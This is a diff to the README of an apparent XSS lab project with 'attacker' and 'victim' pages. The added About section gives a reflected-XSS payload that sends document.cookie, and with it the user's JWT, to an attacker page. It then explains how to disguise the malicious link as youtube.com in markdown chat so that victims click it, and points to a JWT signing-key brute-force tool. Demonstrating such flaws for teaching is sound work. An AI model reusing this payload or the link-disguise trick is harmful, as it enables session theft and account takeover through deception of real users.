@@ -29,7 +29,9 @@
 ```js
 36. app.listen(3000, '192.168.1.100'); // Change this -> '192.168.1.100'
 ```
-7. Run the server. In Console/Terminal type ``node server.js``
+7. Do the same with ``index.html`` Open and change to your local IP in 22 line.
+8. ```fetch("http://x.x.x.x:3000/"``` change only this where is ``x``
+9. Run the server. In Console/Terminal type ``node server.js``
 
 ##### If you did all the steps correctly you should have both attacker and victim page running
 
@@ -43,3 +45,30 @@
 
 ### JWT Signature bruteforce
 > install https://github.com/lmammino/jwt-cracker and try to bruteforce the JWT Signing Key
+
+## About
+This project shows how can you grab someones JWT token by XSS attack. If your victim is logged in you simply sends them:
+  
+  http://localhost/XSS_example/victim/products.php?search=%3Cscript%3Ewindow.location.replace(`http://localhost/XSS_example/attacker/index.html?${document.cookie}`)%3C/script%3E
+
+or if you are using chat app that supports markdown you can embed this link so its more hidden, like this:
+  
+  ```md
+[youtube.com](http://localhost/XSS_example/victim/products.php?search=%3Cscript%3Ewindow.location.replace(`http://localhost/XSS_example/attacker/index.html?${document.cookie}`)%3C/script%3E)
+  ```
+
+on the chat he will see that the link is actually the youtube.com but in reality it grabs his token and sends it to you. Example how it will look:
+
+[youtube.com](http://localhost/XSS_example/victim/products.php?search=%3Cscript%3Ewindow.location.replace(`http://localhost/XSS_example/attacker/index.html?${document.cookie}`)%3C/script%3E)
+
+## How does it work?
+  It injects the <script></script> tag into your DOM
+  and then executes JavaScript Code which is:
+  
+  ```js
+  window.location.replace(`http://localhost/XSS_example/attacker/index.html?${document.cookie}`)
+  ```
+  
+  it replaces your URL with attackers website and grabs your cookies from vulnerable website.
+  In cookies are stored JWT.
+  If the attacker have your JWT then also have access to your whole account.
